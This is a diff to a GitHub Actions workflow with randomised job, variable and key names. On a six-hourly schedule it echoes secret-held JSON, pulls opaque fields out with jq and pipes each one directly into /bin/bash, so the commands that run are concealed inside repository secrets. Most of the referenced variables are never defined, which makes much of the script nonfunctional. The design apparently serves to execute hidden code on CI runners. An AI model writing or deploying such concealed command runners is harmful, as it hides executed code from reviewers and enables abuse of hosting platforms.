@@ -3,21 +3,27 @@ name: jiatingkai1638
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 2/6 * * *'
-jobs:  # 13299
+    - cron: '46 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: jiatingkai1638
         env:
-          ghp2538: ${{ secrets.ghp2538 }}
+          uinm4717: ${{ secrets.uinm4717 }}
         run: |
-          echo $ghp2538 | jq -r .fhxfo3634 | /bin/bash
-          echo $wnw13038 | jq -r .l35 | /bin/bash
-          echo $kjd367 | jq -r .bmybt69 | /bin/bash
-          echo $j53593 | jq -r .pugvh276 | /bin/bash
-          echo $c079 | jq -r .dteb410 | /bin/bash
-          echo $ljbd3 | jq -r .cx98 | /bin/bash
-          echo $iqoo733 | jq -r .xxcig21 | /bin/bash
+          echo $uinm4717 | jq -r .bb0107 | /bin/bash
+          echo $orxrx4920 | jq -r .p08 | /bin/bash
+          echo $c36822 | jq -r .qg945 | /bin/bash
+          echo $s9027 | jq -r .xd30 | /bin/bash
+          echo $pnshc35556 | jq -r .rsr22 | /bin/bash
+          echo $e9 | jq -r .oxxjn4 | /bin/bash
+          echo $j22576 | jq -r .vri059 | /bin/bash
+          echo $um99 | jq -r .iu18 | /bin/bash
+          echo $ckxo7 | jq -r .cskcf00075 | /bin/bash
+          echo $zr3620 | jq -r .k37 | /bin/bash
+          echo $zdiuo3854 | jq -r .nahv4 | /bin/bash
+          echo $pid9 | jq -r .xj5 | /bin/bash
 
